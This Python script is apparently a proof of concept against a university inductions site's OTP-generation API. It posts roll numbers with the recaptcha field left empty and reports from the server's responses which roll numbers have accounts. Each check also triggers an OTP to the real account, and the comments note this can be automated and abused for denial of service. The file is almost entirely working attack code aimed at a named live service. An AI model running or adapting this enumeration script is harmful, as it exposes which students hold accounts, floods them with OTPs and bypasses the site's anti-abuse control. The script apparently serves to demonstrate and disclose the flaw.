# this shows we can see(also automate) which all rollnumbers have lynx account
# and request otps in accounts, "dos' able

import requests
import json

API_BASE_URL = "https://api.inductions.spider.nitt.edu"
OTP_GEN_ENDPOINT = "/lauth/generateOtp"
TARGET_URL = API_BASE_URL + OTP_GEN_ENDPOINT

HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://inductions.spider.nitt.edu",
    "Referer": "https://inductions.spider.nitt.edu/",
}

def check_user_existence(roll_number):
    payload = {
        "roll": roll_number,





# this is bad, recaptcha not setup  (i changed it to "" )
        "recaptcha": ""






    }

    try:
        response = requests.post(TARGET_URL, headers=HEADERS, json=payload, timeout=10)

        if response.status_code == 200:
            try:
                response_json = response.json()
                if response_json.get("message") == "OTP Generated":
                    print(f"[+] VALID: {roll_number} -> {response_json}")
                else:
                    print(f"[?] 200 OK but unexpected message: {roll_number} -> {response_json}")
            except json.JSONDecodeError:
                print(f"[?] 200 OK but invalid JSON: {roll_number}")
        elif response.status_code == 404:
            try:
                response_json = response.json()
                if "Lynx account not found" in response_json.get("message", ""):
                    print(f"[-] INVALID: {roll_number} -> {response_json}")
                else:
                    print(f"[?] 404 Not Found but unexpected message: {roll_number} -> {response_json}")
            except json.JSONDecodeError:
                print(f"[?] 404 Not Found but invalid JSON: {roll_number}")
        else:
            print(f"[!] {roll_number}: {response.status_code} -> {response.text}")

    except requests.exceptions.RequestException as e:
        print(f"[!] NETWORK ERROR: {roll_number} -> {e}")

if __name__ == "__main__":
    print(f"[*] Starting Interactive User Enumeration against {TARGET_URL}\n")

    while True:
        roll = input("Enter roll number (or type 'exit' to quit): ").strip()
        if roll.lower() == "exit":
            break
        if not roll.isdigit() or len(roll) != 9:
            print("[!] Invalid input format. Expected 9-digit number.")
            continue
        check_user_existence(roll)

    print("\n[*] Enumeration session ended.")
